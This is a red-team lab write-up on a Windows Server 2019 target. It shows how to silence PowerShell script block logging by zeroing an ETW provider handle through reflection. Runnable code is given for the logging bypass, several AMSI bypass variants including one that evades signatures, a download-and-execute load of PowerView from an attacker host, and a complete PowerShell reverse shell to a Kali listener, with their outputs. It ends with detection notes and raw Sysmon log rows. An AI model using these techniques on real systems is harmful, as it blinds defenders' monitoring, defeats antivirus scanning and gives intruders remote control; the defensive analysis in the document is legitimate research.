<img width="1880" height="954" alt="defenderonpowerview" src="https://github.com/user-attachments/assets/9cd9296c-e8a7-46a5-8a74-50bc6f06499e" />


# Blinding the Microsoft-Windows-PowerShell ETW Provider
### Managed Reflection Handle Zeroing + AMSI Bypass — Lab Notes
**Platform:** Windows Server 2019 (Build 17763.8644)  
**Date:** 2026-05-28  
**Context:** Local assumed-breach, Administrator session  

---

## Concept

The Microsoft-Windows-PowerShell ETW provider (`{A0C1853B-5C40-4B15-8766-3CF1C58F985A}`) is the source of EID 4104 — script block logging. Every PowerShell command run in a session emits through this provider to two consumers: `EventLog-Application` (the Windows event log, where 4104 lands) and `DefenderApiLogger` (MDE telemetry pipeline).

The goal was to interfere with both consumers simultaneously without killing the provider, patching ntdll, or making any native calls — the equivalent of looping a CCTV feed to a still frame. Camera on, recording light on, feed shows last known good state.

The mechanism: the provider's kernel registration handle lives as a private field (`m_regHandle`) on a `System.Diagnostics.Eventing.EventProvider` object stored as a static field on `PSEtwLogProvider` inside the loaded SMA assembly. Zero the handle via managed reflection. In lab testing, `EtwEventWrite` calls against handle=0 produced no emitted events and no exceptions. The provider continued to report itself active (`m_enabled=1`). No self-healing or re-registration was observed.

---

## Environment

- **OS:** Windows Server 2019 Evaluation, Build 17763.8644  
- **Attacker:** Kali 192.168.1.218  
- **Target:** 192.168.1.251 (local session — Administrator PS window)  
- **Sysmon:** Running (`EventLog-Microsoft-Windows-Sysmon-Operational`, `SYSMON TRACE`, `SysmonDnsEtwSession`)  
- **Defender:** Real-time protection enabled  
- **ETW consumers on PS provider:** `DefenderApiLogger`, `EventLog-Application`  

---

## Phase 1 — Recon

Confirm the provider is registered and identify active consumers:

```powershell
logman query providers | findstr -i powershell
Get-EtwTraceProvider | Where-Object {$_.Guid -eq '{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'}
logman query -ets
```

**Result:**  
- Provider confirmed registered  
- Two consumers: `DefenderApiLogger` (autologger) and `EventLog-Application`  
- Sysmon sessions confirmed running — independent ETW channel, separate attack surface  

Enumerate ETW-related types in the loaded SMA assembly:

```powershell
[System.AppDomain]::CurrentDomain.GetAssemblies() |
  Where-Object { $_.FullName -like '*System.Management.Automation*' } |
  ForEach-Object { $_.GetTypes() } |
  Where-Object { $_.Name -like '*Etw*' -or $_.Name -like '*PSEtw*' } |
  Select-Object FullName
```

**Result:** `System.Management.Automation.Tracing.PSEtwLogProvider` confirmed present in memory.

**Pain point:** Direct PS type accelerator syntax `[System.Management.Automation.Tracing.PSEtwLogProvider]` fails on Server 2019 — the type is not in the default resolution path. Required loading via assembly reference:

```powershell
$assembly = [System.AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.FullName -like '*System.Management.Automation*' }
$type = $assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
```

---

## Phase 2 — Mapping the Provider Object

Enumerate static fields on `PSEtwLogProvider`:

```powershell
$type.GetFields([System.Reflection.BindingFlags]'NonPublic,Static') | Select-Object Name, FieldType
```

**Result:**

| Field | Type |
|---|---|
| `etwProvider` | `System.Diagnostics.Eventing.EventProvider` |
| `PowerShellEventProviderGuid` | `System.String` |
| `_xferEventDescriptor` | `System.Diagnostics.Eventing.EventDescriptor` |

Drill into the provider object's instance fields:

```powershell
$field = $type.GetField('etwProvider', [System.Reflection.BindingFlags]'NonPublic,Static')
$providerObject = $field.GetValue($null)
$providerObject.GetType().GetFields([System.Reflection.BindingFlags]'NonPublic,Instance') | Select-Object Name, FieldType
```

**Result:**

| Field | Type | Purpose |
|---|---|---|
| `m_regHandle` | `System.Int64` | Kernel registration handle |
| `m_enabled` | `System.Int32` | Provider enabled state |
| `m_level` | `System.Byte` | Event level filter |
| `m_anyKeywordMask` | `System.Int64` | Keyword filter |
| `m_etwCallback` | `EtwEnableCallback` | Session enable/disable callback |
| `m_providerId` | `System.Guid` | Provider GUID |
| `m_disposed` | `System.Int32` | Disposal state |

Read baseline values:

```powershell
$iflags = [System.Reflection.BindingFlags]'NonPublic,Instance'
$regHandle = $providerObject.GetType().GetField('m_regHandle', $iflags).GetValue($providerObject)
$enabled   = $providerObject.GetType().GetField('m_enabled',   $iflags).GetValue($providerObject)
$guid      = $providerObject.GetType().GetField('m_providerId', $iflags).GetValue($providerObject)
```

**Baseline:**
```
regHandle : 32934157215428960
enabled   : 1
providerId: a0c1853b-5c40-4b15-8766-3cf1c58f985a
```

Active kernel handle, provider live, GUID correct.

---

## Phase 3 — ETW Provider Interference

Confirm 4104 baseline — script block logging active without GPO registry key (Server 2019 eval default):

```powershell
Invoke-Expression "Write-Host 'ETW_BASELINE_TEST_001'"
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 5 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message
```

**Result:** 4104 landed. Baseline confirmed.

Zero the handle:

```powershell
$handleField = $providerObject.GetType().GetField('m_regHandle', $iflags)
$handleField.SetValue($providerObject, [Int64]0)
Write-Host "regHandle after: $($handleField.GetValue($providerObject))"
```

```
regHandle after: 0
```

Run a post-intervention test:

```powershell
Invoke-Expression "Write-Host 'ETW_BLIND_TEST_001'"
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 5 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message
```

**Observed result:** Event log remained at pre-intervention timestamps. `ETW_BLIND_TEST_001` executed and printed to console. No new 4104 was generated. No exceptions were thrown.

Post-intervention field state:

```
regHandle : 0
enabled   : 1
providerId: a0c1853b-5c40-4b15-8766-3cf1c58f985a
```

`m_enabled=1` — the provider reported itself active. No self-healing or re-registration observed for the duration of the session.

**Sysmon check:** No EID 10, no EID 8, no events correlating to the reflection activity were observed in Sysmon output. The operation produced no Sysmon telemetry in this lab configuration. This is consistent with managed reflection making no `OpenProcess` or similar kernel-visible calls that Sysmon hooks against.

---

## Phase 4 — AMSI Bypass

With provider interference established, next step was loading PowerView from a Kali HTTP share. Three blockers hit in sequence.

**Blocker 1 — Guest SMB blocked by policy**

Initial attempt via SMB:
```powershell
IEX (New-Object Net.WebClient).DownloadString('\\192.168.1.218\share\PowerView.ps1')
```
```
You can't access this shared folder because your organization's security policies block unauthenticated guest access.
```

Fix: restart smbserver with credentials, authenticate via `net use`.

**Blocker 2 — Defender quarantined PowerView off the Kali box**

Once authenticated, Defender scanned the file during the download attempt, flagged `HackTool:PowerShell/PowerView`, and deleted the source file from the Kali share via the open SMB handle. The file on Kali was gone.

Worth noting: Defender followed the file handle across an authenticated SMB session back to a Linux host and deleted the source file. Delivery method matters — SMB gives Defender handle-level access to the source.

Fix: restore PowerView, switch to HTTP:
```bash
# [Kali]
python3 -m http.server 8080
```

**Blocker 3 — AMSI blocked the IEX load**

```
Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

AMSI scanned the download buffer before IEX could execute. The ETW provider interference is irrelevant here — AMSI operates as a separate pre-execution interception pipeline.

**AMSI bypass — signature evasion via fragmented type resolution**

Standard `amsiInitFailed` field-set approach is fully signatured. Three variants blocked in sequence:

```powershell
# Blocked — literal string
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Blocked — string concat on field name only
$a = 'amsi'; $b = 'InitFailed'
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($a+$b,'NonPublic,Static').SetValue($null,$true)

# Blocked — base64 field name, full type string still present
$field = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($field,'NonPublic,Static').SetValue($null,$true)
```

The signature fires on the combined pattern — `AmsiUtils` + `GetField` + `SetValue` in contiguous context. Fragmenting the type string broke it:

```powershell
$c = 'System.Management.Automation.'
$d = 'Amsi'
$e = 'Utils'
$f = [Ref].Assembly.GetType($c+$d+$e)
$g = $f.GetField($a+$b, 'NonPublic,Static')
$g.SetValue($null, $true)
```

**Observed result:** No block. `$g.GetValue($null)` returned `True`. No further AMSI interception observed in session.

---

## Phase 5 — PowerView Execution Under Provider Interference

Load PowerView via HTTP:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.218:8080/PowerView.ps1')
```

No error. No Defender alert observed. No 4104 generated.

Run enumeration:

```powershell
Get-DomainUser -Identity Administrator
```

Full AD object returned — logon count, certificates, group memberships, SID, UAC flags, Distinguished Name.

Check 4104 log:

```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 10 |
    Where-Object { $_.Id -eq 4104 } | Select-Object TimeCreated, Message
```

**Observed result:**

```
5/28/2026 1:59:31 AM  Creating Scriptblock text (1 of 1):...
5/28/2026 1:58:42 AM  Creating Scriptblock text (1 of 1):...
5/28/2026 1:58:06 AM  Creating Scriptblock text (1 of 1):...
5/28/2026 1:58:06 AM  Creating Scriptblock text (1 of 1):...
```

The `01:59:31` entry is the `Get-WinEvent` query itself. The IEX load and `Get-DomainUser` call generated no 4104 entries. The event log was querying its own suppressed telemetry path.

---

## Phase 6 — Reverse Shell Under Provider Interference

With ETW provider interference and AMSI bypass both active in PID 1192, a plain TCP PS reverse shell was executed from the same session:

```powershell
# [WIN] — run from interfered PS session
$client = New-Object Net.Sockets.TCPClient('192.168.1.218',4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

```bash
# [Kali]
nc -lvnp 4444
```

Shell landed. Token confirmed via `whoami /all`:

```
lab2019\administrator
Domain Admins, Enterprise Admins, Schema Admins
SeDebugPrivilege: Enabled
SeImpersonatePrivilege: Enabled
High Mandatory Level
```

No Defender alert observed. No 4104 generated. The only noise during the session was a sample submission popup in a separate unblinded PS window — not the operational window, not blocking.

---

## Phase 7 — ELK Telemetry Validation

ELK (Winlogbeat 8.19.14 → Elasticsearch/Kibana) confirmed the full behavioral skeleton visible to a defender, with zero script block content observed.

**What Sysmon captured — PID 1192 (the interfered process):**

| Time (UTC) | EID | Detail |
|---|---|---|
| 09:05:59 | 3 | `powershell.exe` → `192.168.1.218:445` (SMB — initial delivery attempt, blocked by policy) |
| 09:15:24 | 3 | `powershell.exe` → `192.168.1.218:8080` (HTTP — PowerView download) |
| 09:15:45 | 3 | `powershell.exe` → `192.168.1.251:389` (LDAP — `Get-DomainUser` DC query) |
| 09:33:09 | 3 | `powershell.exe` → `192.168.1.218:4444` (TCP — reverse shell) |
| 09:15:45 | 22 | DNS: `_ldap._tcp.WIN-JOCP945SK51.LAB2019.LOCAL` (PowerView DC discovery) |
| 09:33:20 | 1 | `whoami.exe` spawned by `powershell.exe` PID 1192 |
| 09:33:26 | 1 | `whoami.exe /all` spawned by `powershell.exe` PID 1192 |
| 09:12:25 | 1 | `net.exe use \\192.168.1.218\share /user:osher Password123` |

**What was absent:**

No EID 4104 entries were observed for PID 1192 after provider interference was applied. The IEX load of PowerView, `Get-DomainUser`, the AMSI bypass chain, and the reverse shell payload all executed without generating script block log entries in this lab configuration.

**Credential exposure finding:**

The `net use` command with plaintext credentials appeared twice in EID 1 CommandLine fields — at `09:07:54` and `09:12:25`. Sysmon process create logging captures command line arguments verbatim. In environments with Sysmon process creation and command-line capture enabled, credentials passed via `net use` appear verbatim in EID 1 `CommandLine` fields. This telemetry surface is unaffected by ETW provider interference or AMSI bypass because both operate above process creation telemetry.

**The detection picture an analyst faces:**

A single PS process (`LAB2019\Administrator`, High integrity, Explorer-spawned, PID 1192) made four outbound connections (SMB, HTTP, LDAP, TCP/4444), spawned `whoami`, and opened a subsequent PS window. The behavioral chain is visible; script content is not.

Sysmon gave the analyst the pipe. ETW provider interference removed the water.

---

## Findings Summary

| Telemetry Surface | Observed Status |
|---|---|
| EID 4104 (script block logging) | No events observed after provider interference — PowerView load, enumeration, reverse shell all unlogged |
| DefenderApiLogger | is an MDE telemetry consumer on this provider path. Whether handle zeroing suppresses MDE cloud telemetry was not tested — this lab ran plain Defender without MDE enrollment. |
| Sysmon (interference operation itself) | No events observed — managed reflection produced no Sysmon-visible kernel calls in this configuration |
| Defender real-time (PowerView sig) | No alert observed via HTTP delivery post-AMSI bypass |
| Defender real-time (reverse shell) | No alert observed — payload executed inside interfered session |
| AMSI | Bypassed via fragmented type resolution in lab testing |
| Sysmon EID 3 (network connections) | Fully captured — SMB, HTTP, LDAP, TCP/4444 all logged |
| Sysmon EID 1 (process create) | Fully captured — `whoami`, `net use` with plaintext credentials logged |
| Sysmon EID 22 (DNS) | Fully captured — PowerView DC discovery queries logged |
| `net use` credentials | Appeared in plaintext in EID 1 CommandLine — unaffected by any PS-layer evasion |

---

## Boundaries

This technique affects the **current PS runspace only**. Each PS process has its own `etwProvider` instance. Native binaries (Rubeus, curio.exe) are unaffected — they run in separate processes with their own ETW registrations and their own kernel handles. Kernel-level telemetry (EID 4663 on LSASS, Microsoft-Windows-Threat-Intelligence callbacks, Security Auditing) is out of reach from any userland managed-layer technique.

The interference covers **what ran** — command content, script logic, tradecraft strings captured via script block logging. It does not cover **what that tradecraft did** — LDAP queries, DNS lookups, network connections, and child process creates remain visible to Sysmon and network-level detection.

Useful coverage surface: PS-based enumeration, PS-based lateral movement setup, any tooling running inside the interfered runspace. Not a substitute for operational security at the network or process layer.

---

## Detection Notes

Operationalizing detection against this technique is non-trivial:

- **Negative signal on 4104** — a PS process with meaningful lifetime, network activity, and child processes but no corresponding script block events is anomalous. Requires baselining PS session telemetry against process lifetime, which is not standard in most SIEM deployments. This signal outlives the specific technique — any method of suppressing 4104 produces the same gap.
- **Reflection on SMA assembly** — the `GetAssemblies()` + `GetType()` + `GetField()` + `SetValue()` chain against the SMA assembly produces no native calls and no Sysmon EID 10 in this configuration. Detection would require a custom ETW consumer or AMSI provider monitoring managed reflection patterns at the session level.
- **`m_regHandle` integrity monitoring** — nothing in the default Windows telemetry stack observed in this lab monitors provider handle state. A custom PS engine extension or constrained language mode policy could in principle check this.
- **AMSI bypass pattern** — fragmented type resolution across multiple variable assignments evaded static signatures in lab testing. Behavioral detection would need to correlate `GetType` + `GetField` + `SetValue` calls across a session boundary rather than evaluating each line independently.
- **`net use` credential exposure** — credentials passed via `net use` appear verbatim in Sysmon EID 1 CommandLine regardless of ETW or AMSI state. No PS-layer evasion technique affects process create telemetry. This is a hard boundary worth operationalizing as a detection rule if not already present.

The strongest available primitive remains the 4104 gap: a PS session with process lifetime but absent script block telemetry is an anomaly worth investigating. Difficult to operationalize reliably, but it survives technique evolution.

SELECTED SCREENSHOTS:

<img width="1900" height="940" alt="revshella" src="https://github.com/user-attachments/assets/000c80ad-e89a-4490-a003-4de1d8b3c040" />


<img width="1365" height="878" alt="checkandsetup" src="https://github.com/user-attachments/assets/e0e68e2c-b16d-4077-8abf-4d676c7eb78a" />

<img width="1886" height="960" alt="powerviewFROMDCETWDISABLEDWINDOW" src="https://github.com/user-attachments/assets/6ba2676b-2547-41b4-b3f8-ebc283dbf53b" />

<img width="1882" height="565" alt="powerviewFROMDCETWDISABLEDWINDOWa" src="https://github.com/user-attachments/assets/4b8a9982-8072-4db8-8176-d7b67afa39fc" />

<img width="1210" height="698" alt="revshell" src="https://github.com/user-attachments/assets/d6b77495-4ec5-465b-a8ad-7da16ffe1eb8" />




---

*Lab: Windows Server 2019 / Kali / Sysmon + Winlogbeat + ELK*  
*Series: ETW Blinding — Vector research extension*


"'@timestamp"	"_id"	"_ignored"	"_index"	"_score"	"agent.ephemeral_id"	"agent.hostname"	"agent.id"	"agent.name"	"agent.type"	"agent.version"	"ecs.version"	"event.action"	"event.code"	"event.created"	"event.kind"	"event.provider"	"host.name"	"log.level"	message	"winlog.api"	"winlog.channel"	"winlog.computer_name"	"winlog.event_data.Binary"	"winlog.event_data.CommandLine"	"winlog.event_data.Company"	"winlog.event_data.CurrentDirectory"	"winlog.event_data.Description"	"winlog.event_data.DestinationHostname"	"winlog.event_data.DestinationIp"	"winlog.event_data.DestinationIsIpv6"	"winlog.event_data.DestinationPort"	"winlog.event_data.DestinationPortName"	"winlog.event_data.DeviceName"	"winlog.event_data.DeviceNameLength"	"winlog.event_data.DeviceTime"	"winlog.event_data.DeviceVersionMajor"	"winlog.event_data.DeviceVersionMinor"	"winlog.event_data.FileVersion"	"winlog.event_data.FinalStatus"	"winlog.event_data.Hashes"	"winlog.event_data.Image"	"winlog.event_data.Initiated"	"winlog.event_data.IntegrityLevel"	"winlog.event_data.LogonGuid"	"winlog.event_data.LogonId"	"winlog.event_data.OriginalFileName"	"winlog.event_data.ParentCommandLine"	"winlog.event_data.ParentImage"	"winlog.event_data.ParentProcessGuid"	"winlog.event_data.ParentProcessId"	"winlog.event_data.ParentUser"	"winlog.event_data.ProcessGuid"	"winlog.event_data.ProcessId"	"winlog.event_data.Product"	"winlog.event_data.Protocol"	"winlog.event_data.QueryName"	"winlog.event_data.QueryResults"	"winlog.event_data.QueryStatus"	"winlog.event_data.RuleName"	"winlog.event_data.SourceHostname"	"winlog.event_data.SourceIp"	"winlog.event_data.SourceIsIpv6"	"winlog.event_data.SourcePort"	"winlog.event_data.SourcePortName"	"winlog.event_data.TerminalSessionId"	"winlog.event_data.User"	"winlog.event_data.UtcTime"	"winlog.event_data.param1"	"winlog.event_data.param2"	"winlog.event_id"	"winlog.keywords"	"winlog.opcode"	"winlog.process.pid"	"winlog.process.thread.id"	"winlog.provider_guid"	"winlog.provider_name"	"winlog.record_id"	"winlog.task"	"winlog.user.domain"	"winlog.user.identifier"	"winlog.user.name"	"winlog.user.type"	"winlog.version"
"May 28, 2026 @ 12:58:37.538"	"uRAFbp4ByrYY_kgLoId0"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:58:39.398"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:58:37.532
ProcessGuid: {6e4a868b-11cd-6a18-8201-000000002300}
ProcessId: 896
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 10.0.17763.8276 (WinBuild.160101.0800)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\servicing\TrustedInstaller.exe"	"Microsoft Corporation"	"C:\Windows\system32\"	"Windows Modules Installer"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.8276 (WinBuild.160101.0800)"	" - "	"MD5=DE9504487929A1EDB4C914055D53CFB2,SHA256=5DA778DCC4FD78BE879038A26DC44F021E6F1D49A814E2017C9AAAA4BB8FC76D,IMPHASH=892D11A64BAF1E8BBC19AF5CB650253F"	"C:\Windows\servicing\TrustedInstaller.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"TrustedInstaller.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-11cd-6a18-8201-000000002300}"	896	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:58:37.532"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17379	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:58:35.106"	"thAFbp4ByrYY_kgLoId0"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:58:36.396"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:58:35.104
ProcessGuid: {6e4a868b-11cb-6a18-8001-000000002300}
ProcessId: 2536
Image: C:\Windows\System32\svchost.exe
FileVersion: 10.0.17763.3346 (WinBuild.160101.0800)
Description: Host Process for Windows Services
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69
ParentProcessGuid: {6e4a868b-012a-6a18-0b00-000000002300}
ParentProcessId: 640
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc"	"Microsoft Corporation"	"C:\Windows\system32\"	"Host Process for Windows Services"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.3346 (WinBuild.160101.0800)"	" - "	"MD5=4DD18F001AC31D5F48F50F99E4AA1761,SHA256=2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"	"C:\Windows\System32\svchost.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"svchost.exe"	"C:\Windows\system32\services.exe"	"C:\Windows\System32\services.exe"	"{6e4a868b-012a-6a18-0b00-000000002300}"	640	"NT AUTHORITY\SYSTEM"	"{6e4a868b-11cb-6a18-8001-000000002300}"	2536	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:58:35.104"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17378	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:52:44.963"	"lhAAbp4ByrYY_kgLT4bm"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Dns query (rule: DnsQuery)"	22	"May 28, 2026 @ 12:52:46.207"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Dns query:
RuleName: -
UtcTime: 2026-05-28 09:52:43.959
ProcessGuid: {6e4a868b-106b-6a18-7d01-000000002300}
ProcessId: 3256
QueryName: WIN-JOCP945SK51.lab2019.local
QueryStatus: 0
QueryResults: ::1;::ffff:192.168.1.251;
Image: C:\Windows\System32\dsregcmd.exe
User: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"C:\Windows\System32\dsregcmd.exe"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"{6e4a868b-106b-6a18-7d01-000000002300}"	3256	" - "	" - "	"WIN-JOCP945SK51.lab2019.local"	"::1;::ffff:192.168.1.251;"	0	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:52:43.959"	" - "	" - "	22	" - "	Info	"3,216"	"4,140"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17377	"Dns query (rule: DnsQuery)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
"May 28, 2026 @ 12:52:43.921"	"lRAAbp4ByrYY_kgLT4bm"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"dd67ea66-8c5a-4cdb-9ba5-790e14c535f2"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Process Create (rule: ProcessCreate)"	1	"May 28, 2026 @ 12:52:45.206"	event	"Microsoft-Windows-Sysmon"	"WIN-JOCP945SK51.lab2019.local"	information	"Process Create:
RuleName: -
UtcTime: 2026-05-28 09:52:43.917
ProcessGuid: {6e4a868b-106b-6a18-7d01-000000002300}
ProcessId: 3256
Image: C:\Windows\System32\dsregcmd.exe
FileVersion: 10.0.17763.2989 (WinBuild.160101.0800)
Description: DSREG commandline tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: dsregcmd.exe
CommandLine: ""C:\Windows\System32\dsregcmd.exe"" $(Arg0) $(Arg1) $(Arg2)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {6e4a868b-012b-6a18-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=DAC4DE08394A34ECC1B6E8E4654075FA,SHA256=DF28EFCA1BF09C071F12C1FF8EC5C3FEDFFBEDDF3B4EE45F704E22E1B6B4106B,IMPHASH=382C77BFA0EEE2BA2BA8671D108AD9A3
ParentProcessGuid: {6e4a868b-012e-6a18-2400-000000002300}
ParentProcessId: 1596
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"	wineventlog	"Microsoft-Windows-Sysmon/Operational"	"WIN-JOCP945SK51.lab2019.local"	" - "	"""C:\Windows\System32\dsregcmd.exe"" $(Arg0) $(Arg1) $(Arg2)"	"Microsoft Corporation"	"C:\Windows\system32\"	"DSREG commandline tool"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"10.0.17763.2989 (WinBuild.160101.0800)"	" - "	"MD5=DAC4DE08394A34ECC1B6E8E4654075FA,SHA256=DF28EFCA1BF09C071F12C1FF8EC5C3FEDFFBEDDF3B4EE45F704E22E1B6B4106B,IMPHASH=382C77BFA0EEE2BA2BA8671D108AD9A3"	"C:\Windows\System32\dsregcmd.exe"	" - "	System	"{6e4a868b-012b-6a18-e703-000000000000}"	0x3e7	"dsregcmd.exe"	"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule"	"C:\Windows\System32\svchost.exe"	"{6e4a868b-012e-6a18-2400-000000002300}"	1596	"NT AUTHORITY\SYSTEM"	"{6e4a868b-106b-6a18-7d01-000000002300}"	3256	"Microsoft® Windows® Operating System"	" - "	" - "	" - "	" - "	"'-"	" - "	" - "	" - "	" - "	" - "	0	"NT AUTHORITY\SYSTEM"	"2026-05-28 09:52:43.917"	" - "	" - "	1	" - "	Info	"3,216"	"4,116"	"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"	"Microsoft-Windows-Sysmon"	17376	"Process Create (rule: ProcessCreate)"	"NT AUTHORITY"	"S-1-5-18"	SYSTEM	User	5
